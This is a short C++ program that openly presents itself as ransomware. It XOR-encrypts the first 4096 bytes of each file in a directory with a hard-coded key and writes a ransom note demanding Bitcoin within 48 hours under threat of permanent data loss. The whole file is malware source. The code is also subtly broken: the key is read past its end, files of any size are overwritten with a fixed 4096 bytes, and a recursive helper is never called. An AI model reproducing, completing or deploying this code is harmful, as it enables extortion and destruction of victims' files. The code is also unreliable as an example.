// g++ -o zeroshot zeroshot.cpp

#include <iostream>
#include <fstream>
#include <filesystem>
#include <string>
#include <vector>

namespace fs = std::filesystem;

// Function to encrypt file
void encryptFile(const std::string& filename, const std::string& key) {
    unsigned char keyData[16] = {0};

    // Convert string to array of bytes (16)
    for(int i = 0; i < 16; ++i) 
        keyData[i] = key[i];

    unsigned char fileData[4096];
    std::ifstream input(filename, std::ios::binary | std::ios::in);

    if (!input.is_open()) {
        throw std::runtime_error("Error opening the file");
    }

    input.read(reinterpret_cast<char*>(fileData), 4096);
    input.close();

    for(int i = 0; i < 4096; ++i) 
        fileData[i] ^= keyData[i % 16];

    std::ofstream output(filename, std::ios::binary | std::ios::out);

    if (!output.is_open()) {
        throw std::runtime_error("Error opening the file");
    }

    output.write(reinterpret_cast<char*>(fileData), 4096);
    output.close();
}

// Function to encrypt files in a directory
void encryptFiles(const fs::path& path, const std::string& key) {
    if (!fs::exists(path)) return;

    for (const auto& entry : fs::directory_iterator(path)) {
        if (entry.is_regular_file()) 
            encryptFile(entry.path().string(), key);
        else if (entry.is_directory()) 
            encryptFiles(entry.path(), key);
    }
}

// Function to set up ransomware
void setupRansomware(const std::string& path, const std::string& key) {
    for(auto &entry : fs::directory_iterator(path)) {
        if(entry.is_regular_file())
            encryptFile(entry.path().string(), key);
    }

    // Create a ransom note file
    std::ofstream ransomNote("ransom.txt");
    
    if(ransomNote.is_open()) {
        ransomNote << "Your files are encrypted. To recover them, send $100 to the following Bitcoin address: [bitcoin_address] within 48 hours. Failure to do so will result in permanent loss of your data.\n";
        ransomNote.close();
    }
}

// Main function
int main() {
    try {
        // Key for encryption (should be generated randomly)
        std::string key = "randomkey12345";

        // Path to the directory containing files to encrypt
        fs::path path = "/path/to/your/directory";

        setupRansomware(path, key);

        return 0;
    } catch(const std::exception& e) {
        std::cerr << e.what() << '\n';
        return -1;
    }
}
